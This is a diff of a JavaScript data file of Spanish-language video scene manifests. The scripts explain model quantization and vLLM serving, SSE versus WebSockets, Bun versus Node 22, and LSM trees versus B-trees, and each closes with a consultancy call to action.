-          "visual_cue": "Apertura directa con layout de memoria comparando FP16 (2 bytes) vs INT4 (0.5 bytes)",
+          "visual_cue": "Visualizador de matriz de tensores FP16 comprimiéndose en bloques INT4 GGUF con factor de escala",
           "props": {
-            "header": "REDUCCIÓN DE HUELLA EN VRAM",
-            "title": "FP16 VS CUANTIZACIÓN INT4",
-            "items": [
+            "mode": "quant",
+            "badge": "OPTIMIZACIÓN MATEMÁTICA",
+            "title": "CUANTIZACIÓN INT4 GGUF",
+            "subtitle": "FP16 (16 BITS) VS INT4 NIBBLES EN GPU LOCAL"
+          }
+        },
+        {
+          "id": "memory_nibbles",
+          "type": "memory_layout",
+          "duration": 6,
+          "voiceover": "En vez de almacenar dieciséis bits por peso, agrupamos los valores en bloques de treinta y dos pesos compartiendo una escala alfa. Ocupa un cuarto de la memoria sin perder precisión.",
+          "visual_cue": "Inspección de memoria RAM mostrando empaquetado de dos pesos por cada byte de memoria",
+          "props": {
+            "badge": "EMPAQUETADO DE TENSORES",
+            "title": "ALINEACIÓN DE MEMORIA EN VRAM",
+            "rows": [
               {
-                "name": "PESOS ORIGINALES (FP16)",
-                "addr": "16 BITS POR PESO",
-                "value": "Requiere 32GB VRAM · Servidor de alto coste",
-                "color": "#ef4444"
+                "addr": "0xCUDA010",
+                "hex": [
+                  "6A",
+                  "FE",
+                  "14",
+                  "9C",
+                  "02",
+                  "5B",
+                  "E3",
+                  "77"
+                ],
+                "label": "BLOQUE INT4 (8 PESOS EN 4 BYTES)"
               },
               {
-                "name": "PESOS CUANTIZADOS (INT4)",
-                "addr": "4 BITS POR PESO",
-                "value": "Solo 8GB VRAM · Corre en hardware estándar",
-                "color": "#10b981"
+                "addr": "0xCUDA018",
+                "hex": [
+                  "3F",
+                  "80",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00"
+                ],
+                "label": "FACTOR DE ESCALA ALFA (FLOAT32)"
+              },
+              {
+                "addr": "0xCUDA020",
+                "hex": [
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00"
+                ],
+                "label": "REDUCCIÓN DE HUELLA VRAM: 74%"
               }
             ]
           }
         },
         {
-          "id": "vllm_speed",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Con motores como vLLM y PagedAttention, el servidor procesa peticiones en lotes continuos multiplicando la velocidad de inferencia.",
-          "visual_cue": "Terminal levantando vLLM con modelo cuantizado",
-          "props": {
-            "header": "INFERENCIA DE ALTO RENDIMIENTO",
-            "title": "VLLM CON PAGEDATTENTION",
-            "filename": "deploy/vllm.sh",
-            "codeLines": [
-              "vllm serve Qwen2.5-Coder-32B-Instruct-AWQ \\",
-              "  --gpu-memory-utilization 0.95 \\",
-              "  --max-model-len 32768 \\",
-              "  --port 8000",
-              "# Rendimiento: 120 tokens/s con 40 usuarios concurrentes"
-            ],
-            "cursorLine": 5
-          }
-        },
-        {
           "id": "cta_quant",
-          "type": "tradeoff_matrix",
+          "type": "terminal_split",
           "duration": 5,
           "voiceover": "Ayudo a empresas a desplegar clústeres de inferencia privada con modelos abiertos para no depender de APIs externas. Contáctame en mi perfil.",
-          "visual_cue": "Cierre con consultoría de IA privada",
+          "visual_cue": "Terminal con benchmark de inferencia local vLLM y llamada a la acción en bio",
           "props": {
-            "header": "CONSULTORÍA DE IA PRIVADA",
-            "title": "SOBERANÍA TOTAL DE TUS MODELOS",
-            "cta": {
-              "badge": "INGENIERÍA DE IA (Link en bio)",
-              "text": "¿Quieres correr modelos locales sin pagar APIs caras? Link en mi bio para agendar una sesión."
-            }
+            "header": "INFRAESTRUCTURA DE IA (Link en bio)",
+            "title": "INFERENCIA PRIVADA EN PRODUCCIÓN",
+            "leftTitle": "VLLM SERVER EN LOCAL",
+            "rightTitle": "VENTAJAS DE SOBERANÍA",
+            "leftText": "$ vllm serve Qwen2.5-Coder-32B-AWQ\n✔ Modelo cargado en 8.4 GB VRAM\n✔ Throughput: 114 tokens/segundo\n✔ Cumplimiento estricto GDPR y HIPAA",
+            "rightText": "• Elimina pagos recurrentes de OpenAI\n• Cero fugas de propiedad intelectual\n• Latencia predecible de 15ms\n• Asesoría de despliegue: link en bio"
           }
         }
       ]
@@ -2152,53 +1861,28 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "api_split_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Pagar tokens por cada petición a OpenAI está arruinando tus márgenes y exponiendo los datos privados de tus clientes.",
-          "visual_cue": "Apertura directa con terminal comparando coste de API propietaria vs inferencia local",
+          "id": "latency_api_shock",
+          "type": "latency_scale",
+          "duration": 5.5,
+          "voiceover": "Pagar tokens por cada petición a OpenAI está arruinando tus márgenes y exponiendo los datos privados de tus clientes a servidores de terceros.",
+          "visual_cue": "Escala de latencia comparando tiempo de red a OpenAI vs inferencia local en tu propio hardware",
           "props": {
-            "header": "ANÁLISIS FINANCIERO",
-            "title": "APIS PROPIETARIAS VS HARDWARE PROPIO",
-            "termA": {
-              "title": "APIS PROPIETARIAS EN LA NUBE",
-              "color": "#ef4444",
-              "cmd": "api.openai.com/v1/chat/completions",
-              "status": "Factura escalando sin control",
-              "time": "$6,200/mes",
-              "lines": [
-                "Pagas por cada prompt y cada respuesta",
-                "Riesgo de rate limits y caídas imprevistas",
-                "Tus datos sensibles viajan a servidores de terceros"
-              ]
-            },
-            "termB": {
-              "title": "SERVIDOR DE INFERENCIA VLLM",
-              "color": "#10b981",
-              "cmd": "localhost:8000/v1/chat/completions",
-              "status": "Tarifa plana de servidor con 2x RTX 4090",
-              "time": "$320/mes",
-              "lines": [
-                "Inferencia ilimitada las 24 horas del día",
-                "Latencia local de 15ms sin salir de tu VPC",
-                "Cumplimiento estricto de privacidad GDPR y HIPAA"
-              ]
-            }
+            "header": "LATENCIA Y PRIVACIDAD",
+            "title": "API EXTERNA VS INFERENCIA LOCAL",
+            "subtitle": "TIEMPO DE ESPERA EN RED VS ACCESO IN-HOUSE"
           }
         },
         {
-          "id": "cta_quant_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño e implemento infraestructura de IA on-premise y clústeres vLLM para empresas. Agenda tu diagnóstico en mi perfil.",
-          "visual_cue": "Cierre con consultoría de IA privada",
+          "id": "quant_demo",
+          "type": "quantization_weights_viz",
+          "duration": 6,
+          "voiceover": "Con modelos cuantizados a cuatro bits en un servidor propio con tarjetas RTX obtienes inferencia ilimitada las veinticuatro horas del día por una tarifa fija.",
+          "visual_cue": "Visualizador de tensores cuantizados corriendo en hardware accesible",
           "props": {
-            "header": "CONSULTORÍA DE IA ON-PREMISE",
-            "title": "INFRAESTRUCTURA PRIVADA DE INFERENCIA",
-            "cta": {
-              "badge": "CONSULTORÍA DE IA (Contacto en bio)",
-              "text": "Recorta costes de API y asegura la privacidad de tus datos. Link en mi perfil."
-            }
+            "mode": "quant",
+            "badge": "TARIFAS PLANAS",
+            "title": "HARDWARE PROPIO SIN LÍMITES",
+            "subtitle": "100 TOKENS/S SIN PAGAR POR CADA PROMPT"
           }
         }
       ]
@@ -2219,77 +1903,77 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "sse_stream_hook",
+          "id": "network_pipeline_sse",
           "type": "network_pipeline",
-          "duration": 6.5,
-          "voiceover": "¿Por qué toda la industria de IA usa Server-Sent Events en vez de WebSockets para streaming? Porque SSE viaja sobre HTTP estándar con multiplexación nativa.",
-          "visual_cue": "Apertura directa con conexión HTTP/2 multiplexando múltiples streams",
+          "duration": 6,
+          "voiceover": "Si solo necesitas enviar datos del servidor al navegador, usar WebSockets es complicar tu arquitectura innecesariamente.",
+          "visual_cue": "Tubería de paquetes HTTP/2 mostrando multiplexación de streams SSE con reconexión automática",
           "props": {
-            "header": "TRANSPORTE DE PROTOCOLO",
-            "title": "MULTIPLEXACIÓN HTTP/2 NATIVA",
-            "subtitle": "UN SOLO SOCKET TCP PARA CIENTOS DE STREAMS",
+            "header": "FLUJO DE PAQUETES HTTP/2",
+            "title": "MULTIPLEXACIÓN NATIVA DE STREAMS",
+            "latency": "2.4 ms",
             "stages": [
               {
-                "id": "client",
-                "label": "BROWSER / EVENTSOURCE",
-                "sub": "Reconexión automática nativa sin código extra",
-                "y": 220,
-                "color": "#38bdf8",
-                "metric": "Nativo"
+                "name": "TCP + TLS 1.3 Handshake",
+                "tag": "Conexión compartida"
               },
               {
-                "id": "edge",
-                "label": "CLOUDFLARE / NGINX PROXY",
-                "sub": "Manejo de caché y compresión estándar",
-                "y": 520,
-                "color": "#10b981",
-                "metric": "Zero overhead"
+                "name": "HTTP/2 Stream Multiplexing",
+                "tag": "Mismo puerto 443"
               },
               {
-                "id": "server",
-                "label": "BACKEND NODE / RUST",
-                "sub": "Content-Type: text/event-stream",
-                "y": 820,
-                "color": "#06b6d4",
-                "metric": "Simple loop"
+                "name": "Server-Sent Events Pipeline",
+                "tag": "Text/event-stream"
               }
             ]
           }
         },
         {
-          "id": "sse_code",
-          "type": "code_terminal",
+          "id": "tradeoff_sse_ws",
+          "type": "tradeoff_matrix",
           "duration": 6,
-          "voiceover": "En el navegador no necesitas librerías pesadas. EventSource maneja reconexión automática si el usuario pierde la señal de red.",
-          "visual_cue": "Terminal mostrando código limpio de EventSource en cliente y servidor",
+          "voiceover": "Server-Sent Events corre sobre HTTP tradicional. Tiene reconexión nativa, atraviesa proxies empresariales y aprovecha la compresión de cabeceras de HTTP/2.",
+          "visual_cue": "Matriz comparativa exhaustiva entre SSE y WebSockets",
           "props": {
-            "header": "IMPLEMENTACIÓN LIMPIA",
-            "title": "CLIENTE NATIVO EVENTSOURCE",
-            "filename": "client/stream.ts",
-            "codeLines": [
-              "const es = new EventSource(\"/api/generate\");",
-              "es.onmessage = (event) => {",
-              "  terminal.append(event.data);",
-              "};",
-              "# Reconexión automática nativa mediante cabecera Last-Event-ID",
-              "es.onerror = () => console.log(\"Reconectando...\");"
-            ],
-            "cursorLine": 4
+            "header": "COMPARATIVA DE PROTOCOLOS",
+            "title": "SSE VS WEBSOCKETS EN HTTP/2",
+            "colA": "SERVER-SENT EVENTS (SSE)",
+            "colB": "WEBSOCKETS",
+            "rows": [
+              {
+                "dim": "Transporte",
+                "a": "HTTP/2 Estándar (443)",
+                "b": "Protocolo WS custom",
+                "aGood": true
+              },
+              {
+                "dim": "Reconexión automática",
+                "a": "Nativa en EventSource",
+                "b": "Lógica manual frágil",
+                "aGood": true
+              },
+              {
+                "dim": "Proxies y Firewalls",
+                "a": "Cero problemas de bloqueo",
+                "b": "Cortes frecuentes por proxy",
+                "aGood": true
+              }
+            ]
           }
         },
         {
           "id": "cta_sse",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño arquitecturas backend en tiempo real y streaming de alta concurrencia. Si buscas un desarrollador senior para tu producto, link en mi bio.",
-          "visual_cue": "Cierre con contratación senior backend",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Ayudo a simplificar infraestructuras en tiempo real y eliminar capas de WebSocket innecesarias. Link en mi perfil para auditar tus arquitecturas de red.",
+          "visual_cue": "Terminal mostrando curl -N escuchando stream de eventos y llamada a la acción en bio",
           "props": {
-            "header": "CONTRATACIÓN SENIOR BACKEND",
-            "title": "SISTEMAS DISTRIBUIDOS Y TIEMPO REAL",
-            "cta": {
-              "badge": "SENIOR BACKEND ENGINEER (Link en bio)",
-              "text": "¿Necesitas arquitectura de streaming robusta? Hablemos en el enlace de mi perfil."
-            }
+            "header": "CONSULTORÍA DE PROTOCOLOS (Link en bio)",
+            "title": "STREAMING SENCILLO Y ROBUSTO",
+            "leftTitle": "CURL -N INSPECCIÓN",
+            "rightTitle": "MÉTRICAS CLAVE",
+            "leftText": "$ curl -N https://api.app.io/v1/stream\nHTTP/2 200 OK\ncontent-type: text/event-stream\n\nevent: update\ndata: {\"status\": \"ok\", \"latency\": \"2ms\"}",
+            "rightText": "• Cero servidores socket dedicados\n• Compatible con cualquier CDN y Edge\n• Reduce uso de memoria en un 60%\n• Agenda sesión técnica: link en bio"
           }
         }
       ]
@@ -2310,57 +1994,44 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "ws_tradeoff_hook",
-          "type": "tradeoff_matrix",
-          "duration": 6.5,
-          "voiceover": "Usar WebSockets solo para mostrar texto progresivo o notificaciones complica tus balanceadores de carga sin ninguna necesidad técnica real.",
-          "visual_cue": "Apertura directa con tabla comparativa de Server-Sent Events frente a WebSockets",
+          "id": "ws_failure_hook",
+          "type": "terminal_split",
+          "duration": 6,
+          "voiceover": "Mantener un clúster de WebSockets requiere balanceadores especiales, heartbeat constante y una pesadilla de reconexión cuando falla la red móvil.",
+          "visual_cue": "Terminal mostrando cortes de conexión WebSocket vs flujo continuo de SSE",
           "props": {
-            "header": "CRITERIO DE SELECCIÓN",
-            "title": "SERVER-SENT EVENTS VS WEBSOCKETS",
-            "colA": "SERVER-SENT EVENTS (SSE)",
-            "colB": "WEBSOCKETS (WS)",
-            "rows": [
-              {
-                "dim": "Streaming de IA y feeds",
-                "a": "✔ Perfecto y nativo",
-                "b": "✖ Sobreingeniería",
-                "aGood": true
-              },
-              {
-                "dim": "Reconexión automática",
-                "a": "✔ Manejada por browser",
-                "b": "✖ Manual con código JS",
-                "aGood": true
-              },
-              {
-                "dim": "Compatibilidad con Proxies",
-                "a": "✔ HTTP/2 estándar",
-                "b": "✖ Requiere Upgrade HTTP",
-                "aGood": true
-              },
-              {
-                "dim": "Juegos online y Audio full-duplex",
-                "a": "✖ Unidireccional",
-                "b": "✔ Ideal para bidireccional",
-                "aGood": false
-              }
-            ]
+            "header": "ANTIPATRÓN EN PRODUCCIÓN",
+            "title": "LA FRAGILIDAD DE WEBSOCKETS",
+            "leftTitle": "WEBSOCKET CLÚSTER",
+            "rightTitle": "STREAMING CON SSE",
+            "leftText": "✖ Conexión caída en túnel móvil\n✖ Handshake WS bloqueado por proxy corporativo\n✖ Requiere servidores socket con estado",
+            "rightText": "✔ EventSource reconecta automáticamente\n✔ Pasa por Cloudflare y CDNs sin cambios\n✔ Stateless en balanceadores de carga"
           }
         },
         {
-          "id": "cta_sse_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la arquitectura de red de aplicaciones web para simplificar el stack y mejorar la fiabilidad. Agenda en el link de mi perfil.",
-          "visual_cue": "Cierre con auditoría de arquitectura",
+          "id": "network_diagram",
+          "type": "network_pipeline",
+          "duration": 5.5,
+          "voiceover": "Si tu cliente solo escucha actualizaciones del servidor como chats o cotizaciones, SSE sobre HTTP/2 es diez veces más fácil de operar. Link en mi bio.",
+          "visual_cue": "Tubería de paquetes HTTP/2 procesando el stream de eventos",
           "props": {
-            "header": "AUDITORÍA DE ARQUITECTURA WEB",
-            "title": "SIMPLIFICA TUS CONEXIONES DE RED",
-            "cta": {
-              "badge": "AUDITORÍA DE ARQUITECTURA (Link en perfil)",
-              "text": "Elimina complejidad innecesaria en tu backend. Link en mi perfil para agendar tu revisión."
-            }
+            "header": "SIMPLICIDAD OPERATIVA",
+            "title": "TEXT/EVENT-STREAM EN HTTP/2",
+            "latency": "1.8 ms",
+            "stages": [
+              {
+                "name": "Gateway Edge",
+                "tag": "Caché transparente"
+              },
+              {
+                "name": "HTTP/2 Multiplexing",
+                "tag": "1 sola conexión TCP"
+              },
+              {
+                "name": "Browser EventSource",
+                "tag": "Reconexión automática"
+              }
+            ]
           }
         }
       ]
@@ -2372,62 +2043,67 @@ window.__BIBLIOTECA_2026__ = [
     "group": "13. BUN VS NODE22",
     "label": "Var A (Técnico): V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo",
     "variation": "A (Técnico)",
-    "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
+    "category": "RUNTIMES JAVASCRIPT",
     "manifest": {
       "title": "[13] V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo (Var A)",
-      "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
+      "category": "RUNTIMES JAVASCRIPT",
       "slug": "13_bun_vs_node22",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "runtime_split_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "¿Cómo respondió Node.js ante la velocidad de Bun? Con ejecución nativa de TypeScript sin transpiladores externos en Node veintidós.",
-          "visual_cue": "Apertura directa con terminal ejecutando TypeScript en ambos entornos sin dependencias",
+          "id": "engine_metrics",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Bun conmocionó el ecosistema con JavaScriptCore y arranque casi instantáneo. Pero Node 22 contraatacó con ejecución directa de TypeScript y V8 optimizado.",
+          "visual_cue": "Comparativa de arranque en frío y consumo de memoria entre V8 y JavaScriptCore",
           "props": {
-            "header": "EJECUCIÓN DE TYPESCRIPT SIN BUILD",
-            "title": "ZERO-COMPILATION TYPESCRIPT RUNNERS",
-            "termA": {
-              "title": "NODE.JS 22 (--experimental-strip-types)",
-              "color": "#38bdf8",
-              "cmd": "node --strip-types server.ts",
-              "status": "Elimina tipos en memoria y corre en V8",
-              "time": "0.12s cold start",
-              "lines": [
-                "Cero dependencias: Ni ts-node ni tsx requeridos",
-                "Soporte nativo de módulo de SQLite (node:sqlite)",
-                "Test runner nativo integrado con mock engine"
-              ]
+            "header": "TIEMPO DE ARRANQUE EN FRÍO",
+            "metricA": {
+              "label": "NODE.JS 22 (V8)",
+              "value": "28 ms",
+              "sub": "Flag experimental TypeScript nativo",
+              "color": "#38bdf8"
             },
-            "termB": {
-              "title": "BUN 1.2 (JAVASCRIPTCORE + ZIG)",
-              "color": "#10b981",
-              "cmd": "bun server.ts",
-              "status": "Transpila y optimiza a código máquina",
-              "time": "0.015s cold start",
-              "lines": [
-                "Arranque ultra rápido en 15 milisegundos",
-                "Empaqueta a binario ejecutable único",
-                "Syscalls de red hiperoptimizadas en Zig"
-              ]
+            "metricB": {
+              "label": "BUN (JAVASCRIPTCORE)",
+              "value": "6 ms",
+              "sub": "Compilado en Zig con arranque instantáneo",
+              "color": "#fbbf24"
             }
           }
         },
         {
-          "id": "cta_runtime",
+          "id": "tradeoff_bun_node",
           "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito el rendimiento y la configuración de pipelines TypeScript para reducir tiempos de build y despliegue. Link en mi perfil.",
-          "visual_cue": "Cierre con auditoría de performance en TypeScript",
+          "duration": 6,
+          "voiceover": "Bun gana en velocidad de scripts y tests; Node 22 mantiene la corona de compatibilidad total con librerías nativas de C++ y estabilidad en producción.",
+          "visual_cue": "Matriz técnica de tradeoffs entre ambos runtimes",
           "props": {
-            "header": "AUDITORÍA DE TOOLING Y PERFORMANCE",
-            "title": "OPTIMIZA TU ENTORNO TYPESCRIPT",
-            "cta": {
-              "badge": "AUDITORÍA DE TOOLING (Link en bio)",
-              "text": "¿Tus builds de TypeScript tardan demasiado? Link en mi perfil para optimizar tu stack."
-            }
+            "header": "EVALUACIÓN DE RUNTIMES",
+            "title": "NODE 22 VS BUN EN 2026",
+            "colA": "NODE.JS 22",
+            "colB": "BUN",
+            "rows": [
+              {
+                "dim": "Módulos Nativos C++",
+                "a": "100% Compatibilidad ABI",
+                "b": "Soporte parcial N-API",
+                "aGood": true
+              },
+              {
+                "dim": "TypeScript Nativo",
+                "a": "Type-stripping sin types",
+                "b": "Transpilador completo integrado",
+                "aGood": false
+              },
+              {
+                "dim": "Estabilidad de ecosistema",
+                "a": "15 años de madurez en prod",
+                "b": "Evolución rápida pero cambiante",
+                "aGood": true
+              }
+            ]
           }
         }
       ]
@@ -2439,82 +2115,61 @@ window.__BIBLIOTECA_2026__ = [
     "group": "13. BUN VS NODE22",
     "label": "Var B (Polémico): ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha?",
     "variation": "B (Polémico)",
-    "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
+    "category": "RUNTIMES JAVASCRIPT",
     "manifest": {
       "title": "[13] ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha? (Var B)",
-      "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
+      "category": "RUNTIMES JAVASCRIPT",
       "slug": "13_bun_vs_node22",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "impact_bun_hook",
-          "type": "kinetic_hook",
-          "duration": 4.5,
-          "voiceover": "Bun es increíblemente rápido en tu máquina de desarrollo, pero ¿es seguro migrar toda tu infraestructura de producción hoy mismo?",
-          "visual_cue": "Tipografía de impacto gigante sin iconos repetitivos",
-          "props": {
-            "layout": "impact",
-            "badge": "DECISIÓN DE PRODUCCIÓN",
-            "lines": [
-              {
-                "text": "¿MIGRAR A BUN O",
-                "color": "#ffffff"
-              },
-              {
-                "text": "SEGUIR EN NODE 22?",
-                "color": "#38bdf8"
-              }
-            ],
-            "subtitle": "Velocidad bruta frente a compatibilidad de paquetes"
-          }
-        },
-        {
-          "id": "tradeoff_bun_node",
-          "type": "tradeoff_matrix",
+          "id": "terminal_bench_bun",
+          "type": "terminal_split",
           "duration": 6,
-          "voiceover": "Usa Bun como gestor de paquetes y ejecutor de tests para ganar diez veces más velocidad en CI/CD; evalúa con cuidado las librerías C++ nativas en el servidor.",
-          "visual_cue": "Matriz de compatibilidad y recomendación de adopción gradual",
+          "voiceover": "Reescribir tu infraestructura para correr en Bun puede ser tentador, pero los bugs sutiles en librerías nativas pueden costarte semanas de depuración.",
+          "visual_cue": "Terminal comparando ejecución de tests y compatibilidad de paquetes",
           "props": {
-            "header": "ESTRATEGIA DE ADOPCIÓN",
-            "title": "DÓNDE USAR CADA RUNTIME",
-            "colA": "BUN (DESARROLLO Y CI)",
-            "colB": "NODE 22 (PRODUCCIÓN CORE)",
-            "rows": [
-              {
-                "dim": "Instalación de paquetes en CI",
-                "a": "✔ 30x más rápido",
-                "b": "✖ Lento en pipelines",
-                "aGood": true
-              },
-              {
-                "dim": "Ejecución de tests locales",
-                "a": "✔ Resultados instantáneos",
-                "b": "✖ Mayor consumo CPU",
-                "aGood": true
-              },
-              {
-                "dim": "Librerías legacy en C++ (Addons)",
-                "a": "✖ Casos límite",
-                "b": "✔ 100% compatible N-API",
-                "aGood": false
-              }
-            ]
+            "header": "PRUEBAS DE COMPATIBILIDAD",
+            "title": "NODE 22 VS BUN EN PRODUCCIÓN",
+            "leftTitle": "BUN TEST SUITE",
+            "rightTitle": "NODE 22 ESTABILIDAD",
+            "leftText": "$ bun test\n✔ 840 tests pasados en 0.4s\n✖ Incompatibilidad en paquete grpc-native\n✖ Error inesperado de segmentación",
+            "rightText": "$ node --test\n✔ 840 tests pasados en 1.8s\n✔ 100% compatibilidad con paquetes nativos\n✔ Cero riesgos de fallos en runtime"
           }
         },
         {
-          "id": "cta_runtime_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Ayudo a equipos de ingeniería a modernizar sus proyectos TypeScript sin romper producción. Contáctame en el enlace de mi perfil.",
-          "visual_cue": "Cierre con consultoría de modernización",
+          "id": "metrics_tradeoff",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Usa Bun como gestor de paquetes y test runner en desarrollo; mantén Node 22 para los servidores de producción críticos. Link en bio para asesoría.",
+          "visual_cue": "Métricas de productividad de desarrollo vs estabilidad en producción",
           "props": {
-            "header": "MODERNIZACIÓN DE ARQUITECTURA JS/TS",
-            "title": "TRANSICIÓN SEGURA Y DE ALTO RENDIMIENTO",
-            "cta": {
-              "badge": "CONSULTORÍA SENIOR (Contacto en perfil)",
-              "text": "Moderniza tu stack de JavaScript sin sorpresas. Agenda una sesión técnica en mi biografía."
+            "header": "ESTRATEGIA RECOMENDADA (Link en bio)",
+            "metricA": {
+              "label": "BUN EN DESARROLLO",
+              "value": "30x test speed",
+              "sub": "Iteración ultrarrápida de código",
+              "color": "#10b981"
+            },
+            "metricB": {
+              "label": "NODE 22 EN SERVIDOR",
+              "value": "99.99% uptime",
+              "sub": "Ecosistema robusto sin sorpresas",
+              "color": "#38bdf8"
             }
+          }
+        },
+        {
+          "id": "cta_runtime",
+          "type": "tradeoff_matrix",
+          "duration": 4,
+          "voiceover": "Audito arquitecturas de backend y evalúo migraciones de runtime para equipos que buscan rendimiento real sin riesgos innecesarios. Enlace en perfil.",
+          "visual_cue": "Matriz de decisión final con llamada a la acción en bio",
+          "props": {
+            "header": "CONSULTORÍA DE BACKEND",
+            "title": "DECISIONES BASADAS EN DATOS",
+            "subtitle": "AUDITA TU STACK CON INGENIERÍA REAL"
           }
         }
       ]
@@ -2526,94 +2181,66 @@ window.__BIBLIOTECA_2026__ = [
     "group": "14. LSM TREES VS BTREES",
     "label": "Var A (Técnico): LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco",
     "variation": "A (Técnico)",
-    "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
+    "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
     "manifest": {
       "title": "[14] LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco (Var A)",
-      "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
+      "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
       "slug": "14_lsm_trees_vs_btrees",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "lsm_flow_hook",
-          "type": "architecture_flow",
+          "id": "storage_engine_lsm",
+          "type": "storage_engine_viz",
           "duration": 6.5,
-          "voiceover": "¿Por qué RocksDB escribe a velocidades récord mientras Postgres prefiere B-Trees? Un LSM Tree escribe en una MemTable en RAM y luego vuelca bloques secuenciales inmutables en disco.",
-          "visual_cue": "Apertura directa con arquitectura de escritura secuencial: MemTable a SSTables",
+          "voiceover": "Si tu base de datos colapsa cuando recibe millones de escrituras por segundo, estás usando la estructura de datos equivocada.",
+          "visual_cue": "Visualizador del motor de almacenamiento LSM Tree con MemTable en RAM y compactación de SSTables",
           "props": {
-            "header": "FLUJO DE ESCRITURA EN LSM",
-            "title": "ESCRITURAS SECUENCIALES INMUTABLES",
-            "nodes": [
-              {
-                "id": "ram",
-                "label": "MEMTABLE (SKIPLIST EN RAM)",
-                "sublabel": "Escrituras directas O(1) en memoria DDR5",
-                "color": "#10b981",
-                "y": 160
-              },
-              {
-                "id": "wal",
-                "label": "APPEND-ONLY LOG EN NVMe",
-                "sublabel": "Cero escrituras aleatorias · Máximo throughput",
-                "color": "#fbbf24",
-                "y": 520
-              },
-              {
-                "id": "sst",
-                "label": "SSTABLES INMUTABLES EN DISCO",
-                "sublabel": "Compactación en segundo plano por niveles",
-                "color": "#38bdf8",
-                "y": 880
-              }
-            ]
+            "mode": "lsm",
+            "badge": "ESTRUCTURAS DE ALMACENAMIENTO",
+            "title": "LSM-TREE: LOG-STRUCTURED MERGE",
+            "subtitle": "MEMTABLE EN RAM => FLUSH SECUENCIAL A SSTABLE"
           }
         },
         {
-          "id": "btree_diff",
-          "type": "tradeoff_matrix",
+          "id": "tree_hierarchy_btree",
+          "type": "tree_hierarchy",
           "duration": 6,
-          "voiceover": "En cambio, un B-Tree sobrescribe páginas en ubicaciones aleatorias. Es más lento para escribir, pero sus lecturas son instantáneas con un solo salto.",
-          "visual_cue": "Matriz técnica de compensaciones entre motores",
+          "voiceover": "Los B-Trees de PostgreSQL modifican páginas en disco de forma aleatoria, lo que desgasta los discos SSD y satura el canal de I/O.",
+          "visual_cue": "Visualizador del árbol B balanceado mostrando el coste de la división de páginas",
           "props": {
-            "header": "COMPENSACIONES DE HARDWARE",
-            "title": "LSM-TREE VS B-TREE",
-            "colA": "LSM-TREE (ROCKSDB)",
-            "colB": "B-TREE (POSTGRESQL)",
-            "rows": [
+            "badge": "ESTRUCTURA B-TREE",
+            "title": "PÁGINAS BALANCED-TREE EN DISCO",
+            "items": [
               {
-                "dim": "Velocidad de Escritura",
-                "a": "✔ Ultra rápida (Append-only)",
-                "b": "✖ Lenta (Random page writes)",
-                "aGood": true
+                "name": "Root Node",
+                "level": 0
               },
               {
-                "dim": "Velocidad de Lectura puntual",
-                "a": "✖ Requiere Bloom Filters",
-                "b": "✔ 1 solo seek O(log N)",
-                "aGood": false
+                "name": "Internal Page A",
+                "level": 1
               },
               {
-                "dim": "Amplificación de Escritura",
-                "a": "Alta (Por compactación)",
-                "b": "Baja (Páginas directas)",
-                "aGood": false
+                "name": "Internal Page B",
+                "level": 1
+              },
+              {
+                "name": "Leaf Disk Page (4 KB)",
+                "level": 2
               }
             ]
           }
         },
         {
-          "id": "cta_lsm",
-          "type": "tradeoff_matrix",
+          "id": "latency_lsm",
+          "type": "latency_scale",
           "duration": 5,
-          "voiceover": "Audito motores de persistencia y diagnostico cuellos de botella de disco en sistemas con cargas masivas. Link en mi perfil.",
-          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
+          "voiceover": "Los LSM Trees como RocksDB convierten cada escritura en una operación secuencial en memoria, multiplicando el throughput por diez.",
+          "visual_cue": "Escala de latencia comparando escrituras aleatorias en B-Tree vs escrituras append-only en LSM",
           "props": {
-            "header": "AUDITORÍA DE BASES DE DATOS Y I/O",
-            "title": "RESOLUCIÓN DE CUELLOS DE BOTELLA",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en bio)",
-              "text": "¿Tu base de datos sufre por escrituras masivas? Link en mi perfil para agendar tu auditoría."
-            }
+            "header": "MÉTRICAS DE RENDIMIENTO",
+            "title": "THROUGHPUT DE ESCRITURA",
+            "subtitle": "ESCRITURAS ALEATORIAS VS SECUENCIALES"
           }
         }
       ]
@@ -2625,62 +2252,40 @@ window.__BIBLIOTECA_2026__ = [
